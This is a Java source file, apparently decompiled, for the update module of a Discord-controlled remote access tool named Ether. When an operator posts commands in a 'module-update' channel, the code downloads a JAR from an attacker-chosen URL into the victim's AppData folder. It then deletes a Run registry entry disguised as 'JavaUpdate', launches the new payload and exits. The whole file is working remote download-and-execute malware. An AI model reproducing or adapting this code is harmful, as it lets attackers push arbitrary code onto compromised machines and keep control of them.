package me.Eclipse.Modules.Impl.Admin;

import java.awt.Color;
import java.awt.Desktop;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

import me.Eclipse.Brain;
import me.Eclipse.Utils.FileData;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class UpdateModule {
    private static String UpdateLink;
    private static String UpdateVersion;

    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-update")) {
            if (!var1.getContentDisplay().equalsIgnoreCase("!Update " + Brain.Username) && !var1.getContentDisplay().equalsIgnoreCase("!Update @ALL")) {
                if (var1.getContentDisplay().contains("!Link")) {
                    UpdateLink = var1.getContentDisplay().replace("!Link ", "");
                    Helper.sendMessage(Color.GREEN, "Module Update", "Link has been successfully set to: `" + UpdateLink + "`.", var0);
                } else if (var1.getContentDisplay().contains("!Version")) {
                    UpdateVersion = var1.getContentDisplay().replace("!Version ", "");
                    Helper.sendMessage(Color.GREEN, "Module Update", "Version has been successfully set to: `" + UpdateVersion + "`.", var0);
                }
            } else {
                if (UpdateVersion == null) {
                    Helper.sendMessage(Color.RED, "Module Update", "Version is empty.", var0);
                    return;
                }

                if (UpdateLink == null) {
                    Helper.sendMessage(Color.RED, "Module Update", "Link is empty.", var0);
                    return;
                }

                if (UpdateVersion.equals(Brain.Version)) {
                    Helper.sendMessage(Color.RED, "Module Update", "Update is already installed.", var0);
                    return;
                }

                URL var2 = null;

                try {
                    var2 = new URL(UpdateLink);
                } catch (MalformedURLException var17) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                BufferedInputStream var3 = null;

                try {
                    assert var2 != null;

                    var3 = new BufferedInputStream(var2.openStream());
                } catch (IOException var16) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                ByteArrayOutputStream var4 = new ByteArrayOutputStream();
                byte[] var5 = new byte[1024];

                try {
                    assert var3 != null;

                    int var6;
                    while (-1 != (var6 = var3.read(var5))) {
                        var4.write(var5, 0, var6);
                    }
                } catch (IOException var18) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                try {
                    var4.close();
                } catch (IOException var15) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                try {
                    var3.close();
                } catch (IOException var14) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                byte[] var7 = var4.toByteArray();
                FileOutputStream var8 = null;

                try {
                    var8 = new FileOutputStream("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Ether_" + UpdateVersion + ".jar");
                } catch (FileNotFoundException var13) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                try {
                    assert var8 != null;

                    var8.write(var7);
                } catch (IOException var12) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                try {
                    var8.close();
                } catch (IOException var11) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Error loading update.", var0);
                }

                try {
                    Helper.sendMessage(Color.GREEN, "Module Update (" + Brain.Username + ")", "Version `" + UpdateVersion + "` was successfully downloaded from `" + UpdateLink + "`. Restarting...", var0);
                    if ((new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Ether_" + UpdateVersion + ".jar")).exists()) {
                        Runtime.getRuntime().exec("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v JavaUpdate /f");
                        Desktop.getDesktop().open(new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Ether_" + UpdateVersion + ".jar"));
                        System.exit(-1);
                    } else {
                        Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Update not found.", var0);
                    }
                } catch (IOException var10) {
                    Helper.sendMessage(Color.RED, "Module Update (" + Brain.Username + ")", "Version `" + UpdateVersion + "` was successfully downloaded from `" + UpdateLink + "`.", var0);
                }
            }

        }
    }
}
